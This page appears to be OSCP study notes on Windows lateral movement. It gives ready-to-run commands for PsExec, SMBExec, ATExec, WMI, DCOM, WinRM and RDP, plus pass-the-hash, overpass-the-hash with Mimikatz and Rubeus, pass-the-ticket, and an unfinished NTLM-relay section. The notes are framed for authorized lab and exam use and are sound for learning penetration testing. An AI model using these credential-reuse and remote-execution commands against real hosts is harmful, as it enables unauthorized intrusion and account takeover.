# Move to another host

[Overview](../START.canvas) · [Browser map](../Map.html)

Select credential type → accepted authentication → reachable service → service authorization → execution effect. Hash/ticket use is an authentication dimension; SMB, tasks, WMI, WinRM and RDP are different access mechanisms.

## move-preflight

### Match route, destination service and effective authorization

**Enter:** A credential appears valid but the destination's usable access is unknown

**Discovery**

```text
nmap -Pn -sT -p 135,445,3389,5985,5986 TARGET
getent hosts TARGET_HOST
```

**Interpret:** SMB/RPC are transport candidates while WinRM is not yet reachable; dynamic RPC and authorization are still untested.

**Still check:** Probe the destination from the real source. Check DNS/service names and each required SMB/RPC/WinRM endpoint, then test effective service authorization. An open port and an accepted password do not establish a working remote execution method.

**Verify:** Record exact source, credential type, destination name/service and successfully permitted operation.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-preflight)

### Full procedure and variants

| Material | Compatible starting paths | Important boundary |
| --- | --- | --- |
| Password | SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP | Correct password does not grant the required logon or execution right |
| NT hash | NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported | Net-NTLM and DCC2 are not reusable NT hashes |
| TGT/ccache | Kerberos-capable tool using target FQDN/SPN | Ticket identity, realm, lifetime, DNS and KDC route must match |
| TGS | Only the named `SERVICE/HOST` and compatible client | A CIFS ticket does not authorize WinRM, WMI or RDP |
| AES/NT long-term key | Request a TGT, then use Kerberos | RC4/NT-key requests can fail where RC4 is disabled |
| Local-account password/hash | NTLM or RDP in the target's local account context | Remote UAC/account restrictions commonly filter non-RID-500 local administrators |

| Reachable service | Common execution/access mechanisms | Usual authorization |
| --- | --- | --- |
| SMB 445 + SCM/RPC | PsExec, SMBExec, service creation | Administrative share plus SCM/service rights |
| RPC endpoint mapper 135 + dynamic RPC; often SMB for output | WMIExec, native CIM/WMI, DCOM | Remote WMI/DCOM rights, commonly an effective administrator token |
| Task Scheduler RPC plus SMB output | ATExec | Remote task creation and administrative output access |
| WinRM 5985/5986 | WinRS, PowerShell remoting, Evil-WinRM | Enabled endpoint and endpoint/session authorization |
| RDP 3389 | FreeRDP, MSTSC | Remote-interactive logon right; Restricted Admin requires administrator access |

Directly routed source:

```bash
nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt
getent hosts TARGET_HOST
date -u
```

Windows source:

```powershell
Resolve-DnsName TARGET_HOST
Test-NetConnection TARGET_HOST -Port 445
Test-NetConnection TARGET_HOST -Port 5985
Test-NetConnection TARGET_HOST -Port 3389
w32tm /query /status
```

Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits.

Record:

```text
SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT
-> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT
-> CHOSEN METHOD -> EXPECTED EFFECT
```

NetExec can classify a selected SMB credential:

```bash
# Domain password
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'

# Domain NT hash
nxc smb TARGET -d DOMAIN -u USER -H NT_HASH

# Target-local account
nxc smb TARGET -u Administrator -H NT_HASH --local-auth

# Prove only share access
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
```

> A successful login proves SMB authentication. `(Pwn3d!)` is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed.

For one justified execution proof:

```bash
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec
```

Current NetExec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable.

```text
DOMAIN\USER  -> domain identity; evaluate target-local group/right
TARGET\USER  -> SAM identity on that target
./USER        -> tool-specific local-account selection
```

Common failure pattern:

1. a local account authenticates over SMB;
2. Windows issues a filtered remote token;
3. `ADMIN$`, SCM or WMI administrative operations fail.

Do not “fix” this by changing `LocalAccountTokenFilterPolicy` during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity.

Remote process creation, stdout retrieval and an interactive shell are separate states:

```text
AUTHENTICATED
-> REMOTE OPERATION AUTHORIZED
-> PROCESS/TASK/SERVICE CREATED
-> COMMAND EFFECT OCCURRED
-> OUTPUT RETURNED OR CALLBACK CONNECTED
-> USABLE SESSION
```

- PsExec returns named-pipe I/O through its service.
- WMIExec normally redirects output to an SMB share.
- SMBExec redirects command output while repeatedly creating services.
- ATExec writes output under `ADMIN$\Temp`.
- Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect.
- WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user.
- WinRM creates a remote shell/runspace and returns structured or text output.

A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation.

```cmd
hostname
whoami /all
ipconfig /all
route print
netstat -ano
klist
```

Re-enumerate:

1. local privilege and accessible credential sources;
2. domain groups, ACLs, shares and host rights under the new identity;
3. logged-on sessions and service accounts;
4. interfaces, routes, DNS, listeners and internal reachability;
5. the next evidence-backed host/identity transition.

Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects.

### Follow the evidence

- [ Execute through uploaded service creation using PsExec](lateral-movement.md#move-services) — A destination grants administrative-share write and service-control rights Required: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context
- [ Execute through WMI or native CIM over DCOM](lateral-movement.md#move-wmi) — A destination exposes WMI/DCOM and the identity has useful namespace/process rights Required: RPC endpoint mapper plus negotiated dynamic ports; effective WMI/DCOM rights; the selected output path may additionally need SMB
- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
- [ Obtain an authorized RDP interactive session](lateral-movement.md#move-rdp) — RDP is reachable and the identity may have remote-interactive logon rights Required: Allowed account/session policy and compatible client/NLA/TLS; hash-based Restricted Admin has additional supported-policy/admin requirements
- [ Execute through remote Task Scheduler](lateral-movement.md#move-tasks) — The identity has remote task rights and a compatible output path Required: Task Scheduler RPC reachability, effective task-creation rights and the required administrative output access
- [ Execute through an authorized DCOM application object](lateral-movement.md#move-dcom) — A usable remote COM application and effective activation/method rights Required: RPC/dynamic-port route, allowed DCOM activation and application method, supported authentication and target component
## move-services

### Execute through uploaded service creation using PsExec

**Enter:** A destination grants administrative-share write and service-control rights

**Discovery**

```text
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
```

**Interpret:** Administrative-share control is one PsExec prerequisite, not proof of every service/pipe operation.

**Still check:** Validate actual SCM rights, binary compatibility, service start and named-pipe path; check the final execution identity.

**Verify:** Verify destination and represented execution identity, not only service creation or tool success.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-services)

### Full procedure and variants

```bash
# Password
impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET'

# NT hash / Pass-the-Hash
impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
```

> **Need:** SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM.

Kerberos cache:

```bash
export KRB5CCNAME="$PWD/USER.ccache"
impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
```

The target parameter uses the hostname matching the CIFS/HOST SPN; `-target-ip` separates connection routing from Kerberos naming.

```cmd
PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe
```

> The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable.

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass) — A controlled Windows host may hold useful logged-on identities Required: Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material
- [ Execute commands through service command lines and SMB output](lateral-movement.md#move-smbexec) — SCM rights and SMB output access exist but an uploaded service binary is unsuitable Required: Accepted authentication, service create/start rights and the selected output-share/server path
## move-smbexec

### Execute commands through service command lines and SMB output

**Enter:** SCM rights and SMB output access exist but an uploaded service binary is unsuitable

**Discovery**

```text
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
```

**Interpret:** A share and possible service rights suggest the command-line service route, whose output still has its own access path.

**Still check:** Confirm service create/start, exact output mode/share and command effect independently from retrieved stdout.

**Verify:** Verify command effect separately from successful output retrieval and remove created artifacts as appropriate.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-smbexec)

### Full procedure and variants

```bash
impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET'
impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
```

> SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts.

<details>
<summary><strong>Kerberos and alternate output modes</strong></summary>

```bash
export KRB5CCNAME="$PWD/USER.ccache"
impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'

# SHARE is default; SERVER starts a local SMB server and needs permission to bind locally.
impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET'
```

</details>

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Execute through uploaded service creation using PsExec](lateral-movement.md#move-services) — A destination grants administrative-share write and service-control rights Required: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
## move-tasks

### Execute through remote Task Scheduler

**Enter:** The identity has remote task rights and a compatible output path

**Discovery**

```text
Test-NetConnection TARGET -Port 135
Test-NetConnection TARGET -Port 445
```

**Interpret:** The required network services are candidates; a task cannot be assumed creatable from port results.

**Still check:** Check negotiated RPC reachability, task-create permission, actual principal and administrative output channel.

**Verify:** Verify the actual task effect/principal and destination, not task registration alone.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-tasks)

### Full procedure and variants

```bash
impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami"
impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami"
```

> ATExec creates and deletes a scheduled task and normally retrieves output from `ADMIN$\Temp`. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work.

Kerberos:

```bash
export KRB5CCNAME="$PWD/USER.ccache"
impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami"
```

### Follow the evidence

- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
## move-wmi

### Execute through WMI or native CIM over DCOM

**Enter:** A destination exposes WMI/DCOM and the identity has useful namespace/process rights

**Discovery**

```text
Test-NetConnection TARGET -Port 135
Test-NetConnection TARGET -Port 445
```

**Interpret:** Port 135 and an output route justify further checks but do not prove a WMI process can be created.

**Still check:** Validate dynamic ports, DCOM/WMI authorization, native CIM transport choice and actual effect.

**Verify:** Verify destination process/effect and execution identity separately from captured stdout.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-wmi)

### Full procedure and variants

```bash
impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET'
impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
```

> WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to `ADMIN$`; therefore a WMI process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel.

Kerberos with separate name and route:

```bash
export KRB5CCNAME="$PWD/USER.ccache"
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
```

<details>
<summary><strong>One command, no SMB output</strong></summary>

```bash
impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt"
```

Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.

</details>

```powershell
$Credential = Get-Credential 'DOMAIN\USER'
$Options = New-CimSessionOption -Protocol Dcom
$Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
  CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt'
}

Remove-CimSession $Session
```

> `ReturnValue = 0` and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop.

### Follow the evidence

- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
- [ Diagnose connection direction, listener and session failures in order](execution.md#execution-callback) — Command execution or payload delivery exists but the expected usable channel does not Required: A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence
- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
## move-dcom

### Execute through an authorized DCOM application object

**Enter:** A usable remote COM application and effective activation/method rights

**Discovery**

```text
Test-NetConnection TARGET -Port 135
```

**Interpret:** A named application and route form a candidate; component availability and allowed activation/method remain separate.

**Still check:** Check dynamic RPC, actual class/rights, authentication/tool support, method and verifiable output/effect.

**Verify:** Verify the actual destination effect and identity; COM object creation alone does not prove command execution.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-dcom)

### Full procedure and variants

Current Windows token:

```powershell
$Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST')
$Object = [Activator]::CreateInstance($Type)
$Object.Document.ActiveView.ExecuteShellCommand(
  'cmd.exe',
  $null,
  '/c hostname > C:\Windows\Temp\movement-proof.txt',
  '7'
)
```

Impacket with password or NT hash:

```bash
impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET'
impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
```

> Current Impacket `dcomexec` explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use `wmiexec -k` when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary.

### Follow the evidence

- [ Verify command execution, host and represented identity](sessions-transfers.md#session-proof) — A PoC, injected command or remote client reports execution Required: A functioning execution primitive and an observable output or controlled side effect
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
- [ Repair quoting, encoding and command-length boundaries](execution.md#execution-parser) — A simple command works while a longer or nested payload fails Required: Known outer request/template/database parser and inner shell; correct character encoding and transport length
## move-winrm

### Use WinRM, WinRS or PowerShell remoting

**Enter:** A WinRM listener and a candidate endpoint-authorized account

**Discovery**

```text
Test-NetConnection TARGET -Port 5985
Test-NetConnection TARGET -Port 5986
```

**Interpret:** A reachable endpoint plus a known credential is a candidate, not proof the account may enter that remoting session.

**Still check:** Verify accepted authentication, correct name/TLS context, endpoint rights and any second-hop requirements.

**Verify:** Verify hostname, whoami /all and the actual session configuration/rights.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-winrm)

### Full procedure and variants

##### Evil-WinRM

```bash
# Password; omit -p to prompt where supported
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD'

# NT hash
evil-winrm -i TARGET_HOST -u USER -H NT_HASH

# HTTPS listener
evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986
```

Current Evil-WinRM ticket-file support:

```bash
evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP
```

> **Need:** reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket.

##### Native WinRS

```cmd
winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami"
```

To avoid retaining a password on the command line, use the current authorized Windows credential context where possible:

```cmd
winrs /r:TARGET_HOST "cmd /c hostname & whoami"
```

> WinRS uses WinRM. A non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem.

##### PowerShell remoting

```powershell
Test-WSMan TARGET_HOST
$Credential = Get-Credential 'DOMAIN\USER'

Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock {
  hostname
  whoami /all
}

$Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential
Enter-PSSession -Session $Session
```

> A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes.

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Obtain accessible live logon-session credential material](ad-identities.md#ad-lsass) — A controlled Windows host may hold useful logged-on identities Required: Required process/host privileges, useful sessions and compatible architecture; PPL/Credential Guard/protection may prevent access or remove material
- [ Match route, destination service and effective authorization](lateral-movement.md#move-preflight) — A credential appears valid but the destination's usable access is unknown Required: Real source-to-service route, correct identity context and protocol-specific execution/logon rights
## move-rdp

### Obtain an authorized RDP interactive session

**Enter:** RDP is reachable and the identity may have remote-interactive logon rights

**Discovery**

```text
Test-NetConnection TARGET -Port 3389
```

**Interpret:** RDP transport does not grant desktop access; Restricted Admin/hash use has additional requirements.

**Still check:** Check NLA/TLS, identity qualification, logon authorization and the chosen authentication mode.

**Verify:** Verify destination, user/token and permitted desktop actions; keep credentials out of reusable screenshots/notes.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-rdp)

### Full procedure and variants

Check the installed binary name:

```bash
command -v xfreerdp3 || command -v xfreerdp
```

Password:

```bash
xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
```

Older packages may expose the same syntax through `xfreerdp`.

NT hash:

```bash
xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution
```

> FreeRDP's `/pth` uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override.

Native client:

```cmd
mstsc.exe /v:TARGET_HOST
mstsc.exe /restrictedAdmin /v:TARGET_HOST
```

Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately.

> **Purpose:** use a validated identity with Remote Desktop logon rights to establish a Windows desktop and verify the resulting source position.

##### Baseline: prompt for the password

```bash
xfreerdp3 /v:TARGET /u:USER /dynamic-resolution /cert:ignore
```

Some Kali releases expose `xfreerdp` instead of `xfreerdp3`; check `command -v xfreerdp3 xfreerdp` and the selected binary's `/help` output.

> **Decisive output:** a usable desktop establishes a remote session. Open PowerShell or Command Prompt and verify `whoami`, `hostname` and `ipconfig` before treating commands as target-origin execution.

<details>
<summary><strong>Variant — domain identity</strong></summary>

```bash
xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /dynamic-resolution /cert:ignore
```

Local and domain accounts with the same username are different identities. Make the intended context explicit when results differ.

</details>

<details>
<summary><strong>Variant — authentication only</strong></summary>

```bash
xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore
```

This tests authentication without opening the UI. Success does not guarantee that all session policies or desktop initialization will permit a full session.

</details>

<details>
<summary><strong>Variant — explicit password</strong></summary>

```bash
xfreerdp3 /v:TARGET /u:USER '/p:PASSWORD' /dynamic-resolution /cert:ignore
```

Prefer prompting because command-line passwords can enter shell history and process listings.

</details>

> **Failure cues:** a certificate warning is not a credential result. NLA/security negotiation, account context, authentication, Remote Desktop logon rights and an already occupied/restricted session can fail separately. `/cert:ignore` is appropriate only for the controlled lab context because it removes certificate identity validation.

> **Next:** after verifying the host and identity, enumerate groups/privileges, files, local services/listeners and routes from the new source position.

### Follow the evidence

- [ Establish Windows token, host and process context](windows-privesc.md#windows-state) — A new Windows session or claimed administrator/SYSTEM transition Required: A functioning command channel and the actual effective token/process context
- [ Recover Windows application, history and stored-credential artifacts](windows-privesc.md#windows-secrets) — Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries Required: Artifact read permission and exact protecting identity/context for saved or DPAPI material
- [ Select password, NT hash, key-to-ticket or ticket authentication](lateral-movement.md#move-auth-material) — A password, actual NT hash, AES/NT long-term key or ticket is available Required: Credential type accepted by the chosen protocol/client, correct identity/domain, naming/time and destination authorization
## move-auth-material

### Select password, NT hash, key-to-ticket or ticket authentication

**Enter:** A password, actual NT hash, AES/NT long-term key or ticket is available

**Discovery**

```text
klist
getent hosts TARGET_HOST
date -u
```

**Interpret:** The cache permits investigating a matching CIFS action, not arbitrary WinRM or a new TGS without a TGT/KDC route.

**Still check:** Match NTLM versus Kerberos support, account/domain, key/encryption policy, name/time and destination rights.

**Verify:** Verify exact material type, represented network identity and successful destination action.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/notes/methods/lateral-movement/#move-auth-material)

### Full procedure and variants

##### Pass-the-Hash

```text
NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE
```

PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization.

##### Overpass-the-Hash / key-to-ticket

Mimikatz network-credential context:

```text
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe
```

Rubeus TGT request:

```cmd
Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt
klist
```

AES alternative:

```cmd
Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt
```

Trigger a Kerberos service request with the hostname, then inspect:

```cmd
dir \\TARGET_HOST\C$
klist
```

> In a Mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local `whoami` as the network identity.

##### Pass-the-Ticket

Windows:

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

```text
kerberos::ptt ticket.kirbi
```

Linux:

```bash
export KRB5CCNAME="$PWD/ticket.ccache"
klist
impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST'
```

A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect.

### Follow the evidence

- [ Execute through uploaded service creation using PsExec](lateral-movement.md#move-services) — A destination grants administrative-share write and service-control rights Required: SMB/SCM reachability, writable required share, effective service-creation/start rights and an accepted password/hash or supported Kerberos context
- [ Execute through WMI or native CIM over DCOM](lateral-movement.md#move-wmi) — A destination exposes WMI/DCOM and the identity has useful namespace/process rights Required: RPC endpoint mapper plus negotiated dynamic ports; effective WMI/DCOM rights; the selected output path may additionally need SMB
- [ Use WinRM, WinRS or PowerShell remoting](lateral-movement.md#move-winrm) — A WinRM listener and a candidate endpoint-authorized account Required: Reachable HTTP(S) listener, accepted authentication and endpoint/session configuration permissions; hash/ticket support depends on client/context
- [ Inventory, convert and import tickets in the correct logon context](ad-identities.md#kerberos-tickets) — A valid ticket/cache or a long-term key that can request a TGT Required: Matching client/realm/service, valid lifetime, compatible format and available KDC/service routes; ticket import affects a specific context
## S17

### Evaluate a direct Net-NTLMv2 relay path without spoofing

**Enter:** an explicitly authorized, live NTLM authentication source is already present and a different receiver target is relevant. A saved Net-NTLMv2 response alone does not enter this state.

**Discovery**

```text

```

**Interpret:** identify source protocol/event, relayed principal, receiver protocol/host and source-to-target reachability. For a selected SMB receiver, inspect signing with nmap -p 445 --script smb2-security-mode TARGET.

**Still check:** receiver accepts NTLM, signing/EPA/channel binding/reflection protections permit the exchange, and the relayed principal has one useful target operation. Current exam rules prohibit poisoning/spoofing; Responder name-resolution poisoning is never the source in the exam workflow.
ACTION PROCEDURE PENDING: discovery/validation only.

**Verify:** define success as the chosen receiver operation under the relayed identity, not merely an inbound connection or captured challenge-response.

[Canonical procedure](https://armaanleg3nd.github.io/oscp/cheatsheets/tool-command-reference/#responder-and-ntlm-relay)

### Full procedure and variants

- **Enter:** an explicitly authorized, live NTLM authentication source is already present and a different receiver target is relevant. A saved Net-NTLMv2 response alone does not enter this state.
- **Discover:** identify source protocol/event, relayed principal, receiver protocol/host and source-to-target reachability. For a selected SMB receiver, inspect signing with `nmap -p 445 --script smb2-security-mode TARGET`.
- **Validate:** receiver accepts NTLM, signing/EPA/channel binding/reflection protections permit the exchange, and the relayed principal has one useful target operation. Current exam rules prohibit poisoning/spoofing; Responder name-resolution poisoning is never the source in the exam workflow.
- **Execute:** the existing [tool reference](https://armaanleg3nd.github.io/oscp/cheatsheets/tool-command-reference/#responder-and-ntlm-relay) is not a complete action-specific procedure. Keep execution unavailable pending RW09.
- **Verify:** define success as the chosen receiver operation under the relayed identity, not merely an inbound connection or captured challenge-response.
- **Outcomes:** source + compatible receiver + useful authorization established → ready for RW09 procedure; signing/protocol/authorization decisively blocks it → ruled out for that receiver; protection or source-event behavior unresolved → inconclusive.

### Follow the evidence

